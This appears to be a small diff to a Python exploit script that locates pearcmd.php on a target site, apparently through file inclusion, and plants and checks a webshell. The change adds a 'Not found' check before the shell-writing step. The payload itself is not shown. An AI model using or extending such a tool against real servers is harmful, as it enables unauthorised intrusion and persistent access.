@@ -1,4 +1,4 @@
-﻿# -*- coding:utf-8 -*-
+# -*- coding:utf-8 -*-
 import chardet
 import re
 import urllib
@@ -44,7 +44,7 @@ def getpath(url_mod):
 			pear_path=mpath[i]
 			break
 		else:
-			pear_path=''
+			pear_path='Not found'
 		i=i+1
 	print("pearcmd_path: {}".format(pear_path))
 	return pear_path
@@ -127,12 +127,12 @@ if __name__ == '__main__':
 	
 	if (module == ''):
 		mod_path=getpath(targetUrl)
-		shell_path=getexp(targetUrl,mod_path,path)	
 	else:
 		mod_path=modele.replace("'" ,'')
+	
+	if (mod_path !='Not found'):
 		shell_path=getexp(targetUrl,mod_path,path)
-
-	print('webshell: '+shell_path)
-	prove(targetUrl,shell_path)
-
-
+		print('webshell: '+shell_path)
+		prove(targetUrl,shell_path)
+	else:
+		print("Not pearcmd_path")
